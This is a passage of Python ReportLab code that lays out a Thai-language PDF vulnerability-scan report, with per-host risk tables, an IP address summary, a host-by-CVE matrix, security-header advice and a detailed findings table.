                ("RIGHTPADDING",  (0, 0), (-1, -1),  5),
            ]))
            story.append(pri_t)
            pass  # แสดงทั้งหมด ไม่มีตัดรายการ
            story.append(Spacer(1, 0.12 * cm))
            story.append(PageBreak())
    else:
        vuln_items = [r for r in data["all_results"] if _bucket_of(r.get("status")) == "vulnerable"]
        if vuln_items:
            story.append(P(f"รายการที่ต้องดำเนินการก่อน ({len(vuln_items)} รายการ)", h2))
            for i, r in enumerate(vuln_items, 1):
                _stat_lbl = STATUS_LABELS.get(r.get("status"), r.get("status"))
                _stat_exp = STATUS_EXPLAIN.get(r.get("status"), "")
                story.append(P(f"<b>{i}. {r.get('cve','')}</b> — {r.get('name','')}<br/>"
                               f"<font color='#e03131'>สถานะ: {_stat_lbl}</font>"
                               f"{'  ↳ ' + _stat_exp if _stat_exp else ''}"
                               f"  ·  {r.get('reason','')}", body))
                story.append(Spacer(1, 0.14 * cm))
            story.append(PageBreak())

    # ═══ 4. PER-HOST SUMMARY (multi only) ═══
    if multi:
        story.append(H1("สรุปผลรายเว็บไซต์/โฮสต์"))
        story.append(P("ตารางนี้แสดงภาพรวมของแต่ละเว็บไซต์ที่สแกน เรียงจากอันตรายมากที่สุดไปน้อยที่สุด "
                       "คอลัมน์ 'เสี่ยง' = จำนวนช่องโหว่ที่ยืนยันแล้ว (ต้องแก้ด่วน) · "
                       "'เตือน' = จำนวนสัญญาณเสี่ยงที่ต้องตรวจเพิ่ม · "
                       "'ไม่ทราบ' = กรณีที่ยังสรุปไม่ได้ · "
                       "CVSS = ความรุนแรงสูงสุด (0–10) · ดัชนี = คะแนนความเสี่ยงตามเกณฑ์ CVSS (0–100: 0–39 ต่ำ/ปลอดภัย, 40–69 ปานกลาง, 70–100 สูง/วิกฤต) "
                       "LFI = พบช่องโหว่เปิดไฟล์ภายในระบบ (Local File Inclusion) · "
                       "สีแดง = เสี่ยงสูง · สีส้ม = ต้องตรวจ · สีเขียว = ปลอดภัย", note))
        story.append(Spacer(1, 0.2 * cm))
        hs = sorted([h for h in data["hosts"] if h.get("reachable")],
                    key=lambda h: (-_RISK_ORDER.get(h["risk_level"], 9) * -1, -h["risk_score"]))
        hs = sorted([h for h in data["hosts"] if h.get("reachable")],
                    key=lambda h: (_RISK_ORDER.get(h["risk_level"], 9), -h["risk_score"]))
        unreach = [h for h in data["hosts"] if not h.get("reachable")]
        header = ["โฮสต์", "IP Address", "เซิร์ฟเวอร์", "PHP", "LFI", "เสี่ยง", "เตือน", "ไม่ทราบ", "CVSS", "ดัชนี"]
        rows = [[P(x, cellwh) for x in header]]
        lvl_bg = {"critical": colors.HexColor("#fdecec"), "warning": colors.HexColor("#fff4e6"),
                  "unknown": colors.HexColor("#f4f5f7"), "safe": colors.HexColor("#e9f7ef")}
        shown = hs  # แสดงทั้งหมด
        for hi, h in enumerate(shown, 1):
            cc = h["counts"]
            _h_cvss_str = (f"{h['max_cvss']:.1f}"
                           if (h["max_cvss"] > 0 or h["risk_level"] == "safe")
                           else "-")
            rows.append([P(h["host"], cell), P(h.get("ip", "") or "—", cell),
                         P(h["server"], cell), P(h["php"], cell),
                         P(str(h["lfi"]) if h["lfi"] else "-", cell),
                         P(str(cc["vulnerable"]) if cc["vulnerable"] else "-", cell),
                         P(str(cc["warning"]) if cc["warning"] else "-", cell),
                         P(str(cc["unknown"]) if cc["unknown"] else "-", cell),
                         P(_h_cvss_str, cell),
                         P(str(h["risk_score"]), cell)])
        # 10 คอลัมน์ — รวม 17.0 cm พอดี A4 ที่ margin 1.5+1.5
        t = Table(rows, colWidths=[3.2 * cm, 2.3 * cm, 2.2 * cm, 1.5 * cm, 0.9 * cm,
                                   1.0 * cm, 1.0 * cm, 1.1 * cm, 1.2 * cm, 1.1 * cm],
                  repeatRows=1)
        stl = [("BACKGROUND", (0, 0), (-1, 0), RMUT_BLUE), ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
               ("FONTNAME", (0, 0), (-1, -1), font), ("FONTSIZE", (0, 0), (-1, -1), 7.5),
               ("VALIGN", (0, 0), (-1, -1), "TOP"), ("ALIGN", (4, 0), (-1, -1), "CENTER"),
               ("LINEBELOW", (0, 0), (-1, -1), 0.4, colors.HexColor("#d9dce6")),
               ("TOPPADDING", (0, 0), (-1, -1), 4), ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
               ("LEFTPADDING", (0, 0), (-1, -1), 5)]
        for i, h in enumerate(shown, 1):
            stl.append(("BACKGROUND", (0, i), (-1, i), lvl_bg.get(h["risk_level"], colors.white)))
        t.setStyle(TableStyle(stl))
        story.append(t)
        if unreach:
            story.append(Spacer(1, 0.2 * cm))
            story.append(P(f"เข้าไม่ถึง {len(unreach)} โฮสต์: " +
                           ", ".join(h["host"] for h in unreach) , note))
        story.append(PageBreak())

        # ═══ 4IP. IP ADDRESS REPORT ═══
        # สร้าง IP map: {ip: {hosts, pub}}
        def _is_public_ip(ip):
            if not ip: return None
            try:
                p = [int(x) for x in ip.split(".")]
                if p[0] == 10: return False
                if p[0] == 172 and 16 <= p[1] <= 31: return False
                if p[0] == 192 and p[1] == 168: return False
                if p[0] == 127: return False
                return True
            except Exception: return None

        ip_map = {}
        for _h in data["hosts"]:
            _ip = _h.get("ip") or ""
            if not _ip: continue
            if _ip not in ip_map:
                ip_map[_ip] = {"ip": _ip, "hosts": [], "pub": _is_public_ip(_ip)}
            ip_map[_ip]["hosts"].append(_h)
        ip_list = sorted(ip_map.values(),
                         key=lambda d: (_RISK_ORDER.get(
                             min((h["risk_level"] for h in d["hosts"] if h["reachable"]),
                                 key=lambda l: _RISK_ORDER.get(l, 9), default="n/a"), 9),
                             -len(d["hosts"])))
        no_ip_count = sum(1 for _h in data["hosts"] if not _h.get("ip"))

        story.append(H1("รายงาน IP Address"))
        story.append(P(
            f"ตารางนี้แสดงภาพรวมของ IP Address ที่ใช้งานโดยโฮสต์ทั้งหมดในการสแกนครั้งนี้ "
            f"โฮสต์หลายรายอาจใช้ IP เดียวกัน (Virtual Hosting) — "
            f"พบ <b>{len(ip_map)}</b> IP ที่ไม่ซ้ำ · "
            f"Public: {sum(1 for d in ip_map.values() if d['pub'] is True)} · "
            f"Private: {sum(1 for d in ip_map.values() if d['pub'] is False)} · "
            f"ยังไม่ระบุ IP: {no_ip_count} โฮสต์", note))
        story.append(Spacer(1, 0.2 * cm))

        if ip_list:
            _RO = {"critical": 0, "warning": 1, "unknown": 2, "safe": 3, "n/a": 4}
            _LT = {"critical": "เสี่ยงสูง", "warning": "อาจเสี่ยง",
                   "unknown": "ยังไม่ทราบ", "safe": "ปลอดภัย", "n/a": "เข้าไม่ถึง"}
            _LC = {"critical": "#c0392b", "warning": "#d35400",
                   "unknown": "#6b7280", "safe": "#1e7e34", "n/a": "#9aa0ab"}

            def _worst(hosts):
                best = "n/a"
                for _h2 in hosts:
                    l = _h2["risk_level"] if _h2["reachable"] else "n/a"
                    if _RO.get(l, 9) < _RO.get(best, 9): best = l
                return best

            ip_header = ["IP Address", "ประเภท", "โฮสต์ (จำนวน)", "เสี่ยงสูง", "อาจเสี่ยง", "CVSS สูงสุด", "ระดับ"]
            ip_rows = [[P(x, cellwh) for x in ip_header]]
            _lvl_bg = {"critical": colors.HexColor("#fdecec"), "warning": colors.HexColor("#fff4e6"),
                       "unknown": colors.HexColor("#f4f5f7"), "safe": colors.HexColor("#e9f7ef")}
            _ip_row_levels = []
            for d in ip_list:
                worst = _worst(d["hosts"])
                _ip_row_levels.append(worst)
                pub_label = "Public" if d["pub"] is True else ("Private" if d["pub"] is False else "?")
                crit_cnt = sum(1 for _h2 in d["hosts"] if _h2["reachable"] and _h2["risk_level"] == "critical")
                warn_cnt = sum(1 for _h2 in d["hosts"] if _h2["reachable"] and _h2["risk_level"] == "warning")
                max_cvss = max(((_h2.get("max_cvss") or 0) for _h2 in d["hosts"]), default=0)
                host_names = ", ".join(_h2["host"] for _h2 in d["hosts"][:6])
                if len(d["hosts"]) > 6:
                    host_names += f" +{len(d['hosts']) - 6} อื่น"
                ip_rows.append([
                    P(d["ip"], cell),
                    P(pub_label, cell),
                    P(f"{len(d['hosts'])}  ({host_names})",
                      st("ipcell", fontSize=7, leading=10, fontName=font)),
                    P(str(crit_cnt) if crit_cnt else "-", cell),
                    P(str(warn_cnt) if warn_cnt else "-", cell),
                    P(f"{max_cvss:.1f}" if (max_cvss > 0 or worst == "safe") else "-", cell),
                    P(_LT.get(worst, worst), cell),
                ])
            ip_t = Table(ip_rows,
                         colWidths=[2.8 * cm, 1.5 * cm, 6.0 * cm, 1.3 * cm, 1.5 * cm, 1.8 * cm, 2.1 * cm],
                         repeatRows=1)
            ip_stl = [
                ("BACKGROUND", (0, 0), (-1, 0), RMUT_BLUE),
                ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
                ("FONTNAME", (0, 0), (-1, -1), font),
                ("FONTSIZE", (0, 0), (-1, -1), 7.5),
                ("VALIGN", (0, 0), (-1, -1), "TOP"),
                ("ALIGN", (3, 0), (5, -1), "CENTER"),
                ("LINEBELOW", (0, 0), (-1, -1), 0.4, colors.HexColor("#d9dce6")),
                ("TOPPADDING", (0, 0), (-1, -1), 4),
                ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
                ("LEFTPADDING", (0, 0), (-1, -1), 5),
            ]
            for i, lvl in enumerate(_ip_row_levels, 1):
                ip_stl.append(("BACKGROUND", (0, i), (-1, i), _lvl_bg.get(lvl, colors.white)))
            ip_t.setStyle(TableStyle(ip_stl))
            story.append(ip_t)
        else:
            story.append(P("⚠ ยังไม่พบข้อมูล IP Address — เรียกใช้ไฟล์ v6 ล่าสุดเพื่อให้ระบบบันทึก IP โดยอัตโนมัติขณะสแกน", note))
        story.append(PageBreak())

        # ═══ 4a. CVE COVERAGE MATRIX (โฮสต์ × CVE) ═══
        story.append(H1("ตารางภาพรวม: โฮสต์ × ช่องโหว่ (CVE)"))
        story.append(P("ตารางนี้ให้เห็นภาพรวมว่าโฮสต์ไหนมีช่องโหว่อะไรบ้างในคราวเดียว "
                       "แถวแนวนอน = แต่ละเว็บไซต์/โฮสต์ · คอลัมน์แนวตั้ง = แต่ละช่องโหว่ที่ตรวจ "
                       "มองสีเป็นหลัก: "
                       "<b>แดง ✗</b> = ยืนยันแล้วว่ามีช่องโหว่ (ต้องแก้ด่วน) · "
                       "<b>ส้ม !</b> = พบสัญญาณเสี่ยง (ต้องตรวจยืนยันบนเซิร์ฟเวอร์) · "
                       "<b>เทา ?</b> = ยังสรุปไม่ได้ (ข้อมูลจากภายนอกไม่เพียงพอ) · "
                       "<b>เขียว (ว่าง)</b> = ปลอดภัย/แพตช์แล้ว · "
                       "<b>สีจาง (ว่าง)</b> = ไม่เกี่ยวข้อง (ไม่ได้ใช้ซอฟต์แวร์นี้)", note))
        story.append(Spacer(1, 0.2 * cm))

        _CATO = {"NGINX": 0, "PHP": 1, "Node.js": 2, "GitLab": 3, "App": 4, "Device": 5,
                 "Component": 6, "Exposure": 7, "Framework": 8, "Headers": 9, "TLS": 10,
                 "Online CVE": 11, "OS/Kernel": 12, "Container": 13, "Other": 99}
        _CATC = {"NGINX": "N", "PHP": "P", "Node.js": "J", "GitLab": "G", "App": "A",
                 "Device": "D", "Component": "C", "Exposure": "E", "Framework": "F",
                 "Headers": "H", "TLS": "T", "Online CVE": "O", "OS/Kernel": "K",
                 "Container": "R", "Other": "X"}
        # รวบรวมคอลัมน์ CVE จากทุกโฮสต์ที่เข้าถึงได้
        _cvem = {}
        for _h in hs:
            for _f in _h["findings"]:
                _cv = _f.get("cve")
                if _cv and _cv not in _cvem:
                    _cvem[_cv] = {"name": _f.get("name", ""), "cat": _f.get("category", "Other"),
                                  "sev": _f.get("severity", "")}
        cols = sorted(_cvem, key=lambda c: (_CATO.get(_cvem[c]["cat"], 9), c))
        # รหัสคอลัมน์สั้น ๆ (เช่น N1, P2, G1) + legend
        _code, _seen = {}, {}
        for _cv in cols:
            _p = _CATC.get(_cvem[_cv]["cat"], "X")
            _seen[_p] = _seen.get(_p, 0) + 1
            _code[_cv] = f"{_p}{_seen[_p]}"

        def _mcell(h, cv):
            for f in h["findings"]:
                if f.get("cve") == cv:
                    stt = f.get("status", "unknown")
                    if stt == "n/a":
                        return ("", "#eef0f5", "#9aa0ab")
                    b = _bucket_of(stt)
                    if b == "vulnerable":
                        return ("X", PALETTE["vuln"], "#ffffff")
                    if b == "warning":
                        return ("!", PALETTE["warn"], "#ffffff")
                    if b == "unknown":
                        return ("?", PALETTE["unknown"], "#ffffff")
                    return ("", PALETTE["safe"], "#ffffff")
            return ("", "#eef0f5", "#9aa0ab")

        # เลือกแถว: โฮสต์ที่มีอย่างน้อย 1 ช่อง เสี่ยง/เตือน/ไม่ทราบ ก่อน (อ่านง่าย) สูงสุด 40
        def _host_has_signal(h):
            c = h["counts"]
            return (c["vulnerable"] + c["warning"] + c["unknown"]) > 0
        mrows_src = [h for h in hs if _host_has_signal(h)]
        clean_n = len(hs) - len(mrows_src)
        if not mrows_src and hs:
            mrows_src = hs
            clean_n = 0
        # แสดงทุกโฮสต์ที่มีสัญญาณ ไม่จำกัดจำนวน

        gcell = st("GC", fontSize=8, leading=10, alignment=TA_CENTER, textColor=colors.white)
        hcode = st("HC", fontSize=7.5, leading=9, alignment=TA_CENTER, textColor=colors.white)

        if not cols or not mrows_src:
            story.append(P("ไม่มีข้อมูลเพียงพอสำหรับสร้างเมทริกซ์ (ไม่พบโฮสต์ที่มีสถานะเสี่ยง/เตือน/ไม่ทราบ)", note))
        else:
            # จำนวนคอลัมน์สูงสุดที่ยังพอดีหน้าเดียว (ความกว้างคอลัมน์ขั้นต่ำ 0.62 ซม.)
            # แล้วแบ่งคอลัมน์เป็นชุดที่ "เท่า ๆ กัน" เพื่อไม่ให้ชุดสุดท้ายมีคอลัมน์โดดเดี่ยว 1–2 ตัวจนกินหน้าเพิ่ม
            _MAXCOLS = int((16.2 - 3.8) / 0.62)          # ≈ 20 คอลัมน์ต่อหนึ่งตาราง
            _nchunks = max(1, (len(cols) + _MAXCOLS - 1) // _MAXCOLS)
            CHUNK = (len(cols) + _nchunks - 1) // _nchunks
            for ci in range(0, len(cols), CHUNK):
                cset = cols[ci:ci + CHUNK]
                ncol = len(cset)
                cw = min(1.0, max(0.62, (16.2 - 3.8) / ncol))
                head = [P("โฮสต์", cellwh)] + [P(_code[c], hcode) for c in cset]
                rows = [head]
                cellbg = []   # (col,row,color)
                for ri, h in enumerate(mrows_src, 1):
                    row = [P(h["host"], cell)]
                    for cj, c in enumerate(cset, 1):
                        glyph, bg, fg = _mcell(h, c)
                        row.append(P(glyph, ParagraphStyle("gc%d%d" % (ri, cj), parent=gcell, textColor=colors.HexColor(fg))))
                        cellbg.append((cj, ri, bg))
                    rows.append(row)
                t = Table(rows, colWidths=[3.8 * cm] + [cw * cm] * ncol, repeatRows=1)
                stl = [("BACKGROUND", (0, 0), (-1, 0), RMUT_BLUE),
                       ("FONTNAME", (0, 0), (-1, -1), font), ("FONTSIZE", (0, 0), (-1, -1), 7.5),
                       ("VALIGN", (0, 0), (-1, -1), "MIDDLE"), ("ALIGN", (1, 0), (-1, -1), "CENTER"),
                       ("GRID", (0, 0), (-1, -1), 0.4, colors.HexColor("#d9dce6")),
                       ("TOPPADDING", (0, 0), (-1, -1), 3), ("BOTTOMPADDING", (0, 0), (-1, -1), 3),
                       ("LEFTPADDING", (0, 0), (-1, -1), 3), ("RIGHTPADDING", (0, 0), (-1, -1), 3)]
                for (cj, ri, bg) in cellbg:
                    stl.append(("BACKGROUND", (cj, ri), (cj, ri), colors.HexColor(bg)))
                t.setStyle(TableStyle(stl))
                story.append(t)
                story.append(Spacer(1, 0.25 * cm))

            if clean_n > 0:
                story.append(P(f"อีก {clean_n} โฮสต์ไม่มีช่องเสี่ยง/เตือน/ไม่ทราบ (ปลอดภัย/ไม่เกี่ยวข้องทั้งแถว) — ไม่แสดงในเมทริกซ์", note))
            # legend: code → CVE เต็ม
            story.append(Spacer(1, 0.15 * cm))
            story.append(P("คำอธิบายรหัสคอลัมน์", h2))
            lg = [[P("รหัส", cellwh), P("CVE", cellwh), P("หมวด", cellwh), P("ความรุนแรง", cellwh), P("ชื่อย่อ", cellwh)]]
            for c in cols:
                m = _cvem[c]
                lg.append([P(_code[c], cell), P(c, cell), P(m["cat"], cell),
                           P(m["sev"] or "-", cell), P((m["name"] or "")[:46], cell)])
            lt = Table(lg, colWidths=[1.3 * cm, 3.4 * cm, 1.8 * cm, 2.3 * cm, 7.0 * cm], repeatRows=1)
            lt.setStyle(TableStyle([("BACKGROUND", (0, 0), (-1, 0), RMUT_BLUE),
                                    ("FONTNAME", (0, 0), (-1, -1), font), ("FONTSIZE", (0, 0), (-1, -1), 7.5),
                                    ("VALIGN", (0, 0), (-1, -1), "TOP"),
                                    ("LINEBELOW", (0, 0), (-1, -1), 0.4, colors.HexColor("#d9dce6")),
                                    ("TOPPADDING", (0, 0), (-1, -1), 3), ("BOTTOMPADDING", (0, 0), (-1, -1), 3),
                                    ("LEFTPADDING", (0, 0), (-1, -1), 5)]))
            story.append(lt)
        story.append(PageBreak())

        # ═══ 4b. PER-HOST DETAILS (top risky hosts) ═══
        risky_all = [h for h in hs if h["top"]]
        if risky_all:
            # จัดกลุ่มโฮสต์ที่มี "รูปแบบช่องโหว่เหมือนกัน" (signature = ชุด cve+สถานะ) เพื่อไม่ให้ซ้ำซ้อน
            groups = {}
            for h in risky_all:
                sig = tuple(sorted((r.get("cve", ""), r.get("status", "")) for r in h["top"]))
                groups.setdefault(sig, []).append(h)
            # เรียงกลุ่มตามคะแนนสูงสุดของสมาชิก แล้วตามจำนวนสมาชิก
            grouped = sorted(groups.values(),
                             key=lambda hs_: (-max(x["risk_score"] for x in hs_), -len(hs_)))
            story.append(H1("รายละเอียดช่องโหว่รายโฮสต์ (จัดกลุ่มตามรูปแบบที่พบ)"))
            story.append(P("โฮสต์ที่พบช่องโหว่ชุดเดียวกันถูกจัดเป็นกลุ่มเดียว เพื่อให้อ่านง่ายและไม่ซ้ำซ้อน "
                           f"(ทั้งหมด {len(risky_all)} โฮสต์ที่มีความเสี่ยง · {len(grouped)} รูปแบบ)", note))
            story.append(Spacer(1, 0.15 * cm))
            # ── กล่องอธิบายสถานะ ──
            _leg = st("leg", fontSize=8, leading=12, textColor=colors.HexColor("#374151"))
            _leg_hd = st("leghd", fontSize=8.5, leading=12, textColor=colors.HexColor("#1e40af"))
            leg_data = [
                [P("คำอธิบายสถานะที่ใช้ในรายงานนี้", _leg_hd), P("", _leg_hd)],
                [P("<font color='#c0392b'>● เสี่ยง</font> — ยืนยันจากภายนอกแล้วว่ามีช่องโหว่ ต้องแก้ไขทันที", _leg),
                 P("<font color='#d35400'>● น่าจะเสี่ยง</font> — เวอร์ชันและพฤติกรรมบ่งชี้ว่าเสี่ยง ควรตรวจบนเครื่อง", _leg)],
                [P("<font color='#d35400'>● ต้องตรวจยืนยัน</font> — พบสัญญาณเสี่ยงจากภายนอก แต่ต้องยืนยันการตั้งค่าบนเซิร์ฟเวอร์", _leg),
                 P("<font color='#6b7280'>● ยังสรุปไม่ได้</font> — ซ่อนข้อมูล ต้องตรวจบนเครื่องจริง", _leg)],
                [P("<font color='#b45309'>● รุ่นที่มีช่องโหว่</font> — ใช้รุ่นซอฟต์แวร์ที่ทราบว่ามีปัญหา ต้องอัปเดต", _leg),
                 P("<font color='#166534'>● แพตช์แล้ว / ไม่เกี่ยวข้อง</font> — ไม่พบช่องโหว่นี้บนโฮสต์นี้", _leg)],
            ]
            leg_t = Table(leg_data, colWidths=[8.3*cm, 8.3*cm])
            leg_t.setStyle(TableStyle([
                ("BACKGROUND",    (0, 0), (-1, 0),  colors.HexColor("#dbeafe")),
                ("BACKGROUND",    (0, 1), (-1, -1), colors.HexColor("#f8faff")),
                ("SPAN",          (0, 0), (-1, 0)),
                ("BOX",           (0, 0), (-1, -1), 0.6, colors.HexColor("#93c5fd")),
                ("LINEBELOW",     (0, 0), (-1, -2), 0.3, colors.HexColor("#bfdbfe")),
                ("TOPPADDING",    (0, 0), (-1, -1), 5),
                ("BOTTOMPADDING", (0, 0), (-1, -1), 5),
                ("LEFTPADDING",   (0, 0), (-1, -1), 8),
            ]))
            story.append(leg_t)
            story.append(Spacer(1, 0.2 * cm))
            story.append(Spacer(1, 0.15 * cm))
            for gi, members in enumerate(grouped, 1):
                rep = max(members, key=lambda x: x["risk_score"])  # ตัวแทนของกลุ่ม
                hosts_line = ", ".join(m["host"] for m in members)
                story.append(P(f"รูปแบบที่ {gi}  "
                               f"<font size=8 color='#6b7280'>· {len(members)} โฮสต์ · คะแนน ~{rep['risk_score']}/100 · {rep['server']}</font>", h2))
                story.append(P(f"<font size=8 color='#6b7280'>โฮสต์ในกลุ่มนี้: {hosts_line}</font>",
                               st("grp", fontSize=8, leading=11, leftIndent=8, textColor=GREY)))
                for r in rep["top"][:12]:
                    _bkt = _bucket_of(r.get("status"))
                    col = {"vulnerable": "#c0392b", "warning": "#d35400", "unknown": "#6b7280"}.get(_bkt, "#6b7280")
                    _stat_lbl = STATUS_LABELS.get(r.get("status"), r.get("status"))
                    # เพิ่มคำอธิบายสถานะสำหรับสถานะที่อาจไม่ชัดเจน
                    _stat_exp = STATUS_EXPLAIN.get(r.get("status"), "")
                    _exp_txt = (f"<br/><font size=7.5 color='{col}'>"
                                f"↳ {_stat_exp}</font>" if _stat_exp and _bkt in ("vulnerable", "warning", "unknown") else "")
                    _reason_txt = r.get("reason", "")[:200]
                    story.append(P(f"• <b>{r.get('cve','')}</b> ({r.get('category','')}, CVSS {_cvss(r):.1f} · EPSS {int(_epss(r)*100)}% · {_cwe(r)}) — {r.get('name','')} "
                                   f"<font color='{col}'>[{_stat_lbl}]</font>"
                                   f"{_exp_txt}"
                                   f"<br/><font size=8 color='#374151'>{_reason_txt}</font>",
                                   st("hostf", fontSize=9, leading=13, leftIndent=8)))
                story.append(Spacer(1, 0.2 * cm))
            story.append(PageBreak())

    # ═══ 4c. SECURITY POSTURE: HTTP Headers / Cookie / Banner (A1/A2/A4) ═══
    if multi and s.get("hdr_hosts"):
        story.append(H1("การตั้งค่าความปลอดภัยพื้นฐานของเว็บไซต์"))
        story.append(P("เว็บเซิร์ฟเวอร์ทุกตัวสามารถตั้งค่า 'ป้ายกำกับความปลอดภัย' (Security Headers) เพื่อบอกเบราว์เซอร์ว่าต้องป้องกันผู้ใช้อย่างไร "
                       "ถ้าขาดป้ายเหล่านี้ เบราว์เซอร์จะไม่รู้ว่าต้องป้องกัน ทำให้แฮกเกอร์อาจหลอกให้ผู้ใช้คลิกลิงก์อันตราย "
                       "หรือขโมย Cookie (ข้อมูลล็อกอิน) ได้ — "
                       f"ตรวจสอบจาก {s['hdr_hosts']} เว็บไซต์ที่เข้าถึงได้ขณะสแกน ปัญหากลุ่มนี้แก้ได้เร็วโดยแอดมินเซิร์ฟเวอร์", note))
        story.append(Spacer(1, 0.2 * cm))
        hm = s["hdr_missing"]
        bar_items = [(desc, hm.get(hk, 0), PALETTE["warn"]) for hk, desc in SEC_HEADERS]
        for fl in native_bars(bar_items, title="จำนวนโฮสต์ที่ขาด Security Header แต่ละชนิด"):
            story.append(fl)
        story.append(Spacer(1, 0.3 * cm))
        extra = [["Cookie ไม่ปลอดภัย (ขาด Secure/HttpOnly/SameSite)", f"{s['cookie_bad']} โฮสต์"],
                 ["เปิดเผยเวอร์ชัน/แบนเนอร์เซิร์ฟเวอร์", f"{s['banner_disc']} โฮสต์"],
                 ["ใบรับรอง TLS ใกล้หมดอายุ (≤30 วัน)", f"{s.get('cert_expiring', 0)} โฮสต์"],
                 ["ใบรับรอง TLS หมดอายุแล้ว", f"{s.get('cert_expired', 0)} โฮสต์"],
                 ["ปัญหาใบรับรอง TLS (ตรวจสอบไม่ผ่าน)", f"{s.get('cert_problem', 0)} โฮสต์"]]
        et = Table([[P(a, cellb), P(b, cell)] for a, b in extra], colWidths=[10.5 * cm, 6.1 * cm])
        et.setStyle(TableStyle([("BACKGROUND", (0, 0), (0, -1), RMUT_LIGHT),
                                ("LINEBELOW", (0, 0), (-1, -1), 0.4, colors.HexColor("#d9dce6")),
                                ("TOPPADDING", (0, 0), (-1, -1), 6), ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
                                ("LEFTPADDING", (0, 0), (-1, -1), 8)]))
        story.append(et)
        story.append(P("📌 คำแนะนำสำหรับผู้ดูแลระบบ: ให้แอดมินเว็บเซิร์ฟเวอร์เพิ่มส่วนหัว HTTP ต่อไปนี้ใน config: "
                       "HSTS (บังคับ HTTPS), CSP (ป้องกันสคริปต์แปลกปลอม), X-Frame-Options (กัน Clickjacking), "
                       "X-Content-Type-Options, Referrer-Policy, Permissions-Policy — "
                       "นอกจากนี้ตั้ง Cookie ให้มีแฟล็ก Secure+HttpOnly+SameSite เพื่อป้องกันการขโมย Cookie "
                       "และซ่อนเวอร์ชันซอฟต์แวร์ในแบนเนอร์เพื่อไม่ให้แฮกเกอร์รู้ว่าใช้ระบบรุ่นไหน",
                       st("hdradv", fontSize=9, leading=13, textColor=GREY, spaceBefore=6)))
        story.append(PageBreak())

    # ═══ 5. DETAILED FINDINGS (flat table) ═══
    story.append(H1("รายละเอียดผลการตรวจสอบช่องโหว่"))
    story.append(P(f"ตรวจพบช่องโหว่/สัญญาณเสี่ยงจริง <b>{s.get('detected', s['vulnerable'] + s['warning'])}</b> รายการ "
                   f"(จากรายการที่ใช้สแกนทั้งหมด {s['total']} รายการ) — เรียงรายการที่เสี่ยงสูงสุดไว้ก่อน "
                   "สีแดง = ยืนยันแล้วว่ามีช่องโหว่ (ต้องแก้ไขด่วน) · "
                   "สีส้ม = พบสัญญาณเสี่ยง (ต้องตรวจยืนยันบนเซิร์ฟเวอร์) · "
                   "สีเทา = ยังสรุปจากภายนอกไม่ได้ · สีเขียว = ปลอดภัย/ไม่เกี่ยวข้อง "
                   "คอลัมน์ CVSS = ความรุนแรง (0–10) · "
                   "EPSS = โอกาสที่แฮกเกอร์จะใช้ช่องโหว่นี้จริงภายใน 30 วัน (%)", note))
    story.append(Spacer(1, 0.2 * cm))
    _multi_cols = multi and s.get("hosts_total", 1) > 1
    if _multi_cols:
        header = ["โฮสต์", "CVE", "CVSS", "EPSS", "ชื่อ", "ประเภท", "ความรุนแรง", "สถานะ"]
        cws = [3.1 * cm, 2.2 * cm, 1.0 * cm, 1.1 * cm, 2.6 * cm, 1.3 * cm, 1.8 * cm, 1.8 * cm]
    else:
        header = ["CVE", "CVSS", "EPSS", "ชื่อ", "ประเภท", "ความรุนแรง", "สถานะ", "เหตุผล"]
        cws = [2.3 * cm, 1.0 * cm, 1.0 * cm, 2.8 * cm, 1.3 * cm, 1.8 * cm, 1.7 * cm, 3.6 * cm]
    rows = [[P(x, cellw) for x in header]]
    status_bg = {"safe": colors.HexColor("#e9f7ef"), "vulnerable": colors.HexColor("#fdecec"),
                 "warning": colors.HexColor("#fff4e6"), "unknown": colors.HexColor("#f4f5f7")}
    sorted_results = sorted(data["all_results"],
                            key=lambda x: (_BUCKET_ORDER.get(_bucket_of(x.get("status")), 9),
                                           -_cvss(x), -_epss(x), _host_label(x.get("target", ""))))
    MAXROWS = len(sorted_results)  # แสดงทั้งหมด
    show_rows = sorted_results
    for r in show_rows:
        if _multi_cols:
            rows.append([P(_host_label(r.get("target", "")), cell), P(r.get("cve", ""), cell),
                         P(f"{_cvss(r):.1f}", cell), P(f"{int(_epss(r)*100)}%", cell),
                         P(r.get("name", ""), cell), P(r.get("category", ""), cell),
                         P(r.get("severity", "").split("(")[0].strip(), cell),
                         P(STATUS_LABELS.get(r.get("status"), r.get("status", "")), cell)])
        else:
            rows.append([P(r.get("cve", ""), cell), P(f"{_cvss(r):.1f}", cell), P(f"{int(_epss(r)*100)}%", cell),
                         P(r.get("name", ""), cell), P(r.get("category", ""), cell),
                         P(r.get("severity", "").split("(")[0].strip(), cell),
                         P(STATUS_LABELS.get(r.get("status"), r.get("status", "")), cell),
                         P(r.get("reason", "")[:80], cell)])
    if not show_rows:
        _unreach_err = (data["hosts"][0].get("error") if data.get("hosts") else "") or "ไม่สามารถเชื่อมต่อเป้าหมายได้ขณะสแกน"
        if _multi_cols:
            rows.append([P(_host_label(data.get("target", "-")), cell), P("-", cell),
                         P("-", cell), P("-", cell), P("ไม่สามารถตรวจสอบได้", cell),
                         P("-", cell), P("-", cell), P(_unreach_err[:60], cell)])
        else:
            rows.append([P("-", cell), P("-", cell), P("-", cell),
                         P("ไม่สามารถตรวจสอบรายการ CVE ได้", cell), P("-", cell),
                         P("-", cell), P("เข้าถึงไม่ได้", cell), P(_unreach_err[:80], cell)])
    t = Table(rows, colWidths=cws, repeatRows=1)
    style = [("BACKGROUND", (0, 0), (-1, 0), RMUT_BLUE), ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
             ("FONTNAME", (0, 0), (-1, -1), font), ("FONTSIZE", (0, 0), (-1, -1), 7.5),
             ("VALIGN", (0, 0), (-1, -1), "TOP"),
             ("LINEBELOW", (0, 0), (-1, -1), 0.4, colors.HexColor("#d9dce6")),
             ("TOPPADDING", (0, 0), (-1, -1), 4), ("BOTTOMPADDING", (0, 0), (-1, -1), 4),
             ("LEFTPADDING", (0, 0), (-1, -1), 5)]
    for i, r in enumerate(show_rows, 1):
        style.append(("BACKGROUND", (0, i), (-1, i), status_bg[_bucket_of(r.get("status"))]))
    if not show_rows:
        style.append(("BACKGROUND", (0, 1), (-1, 1), status_bg["unknown"]))
    t.setStyle(TableStyle(style))
    story.append(t)
    pass  # แสดงทุกรายการ ไม่มีตัด
